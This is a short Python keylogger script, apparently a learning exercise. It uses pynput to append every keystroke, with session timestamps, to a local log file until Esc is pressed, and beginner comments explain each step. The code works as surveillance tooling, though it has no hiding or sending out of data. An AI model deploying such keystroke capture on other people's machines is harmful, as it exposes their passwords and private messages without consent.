from pynput import keyboard
import datetime

log_file=open("log.txt","a")
log_file.write(f"\n--- Session started: {datetime.datetime.now()}---\n\n")
log_file.flush()#flush forces python to write it imediately rather than storing in its memory and writing it later.
def on_press(key):
    try:
        log_file.write(key.char) #any alphabatical and numerical keys pressed.
        log_file.flush() 
    except AttributeError:
        log_file.write(f"[{key}]") #if keys like Shift,Ctrl and others are pressed.
        log_file.flush()
        
        #(f"[{key}]") is used cause key is not a string for special key, and its an object key, also using brackets makes the output more readable.(hello[Key.enter]world) without all meshed together.
    if key == keyboard.Key.esc:
        log_file.write(f"\n\n--- Session ended: {datetime.datetime.now()} ---\n")
        log_file.close()
        return False

#first on_press is a default function and is the Listener asking what function should i use, the second one is the function we defined above.

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    #join is used to stop and wit for a responce or capture, it will wait until i manually kill it in the terminal using Ctrl+C.


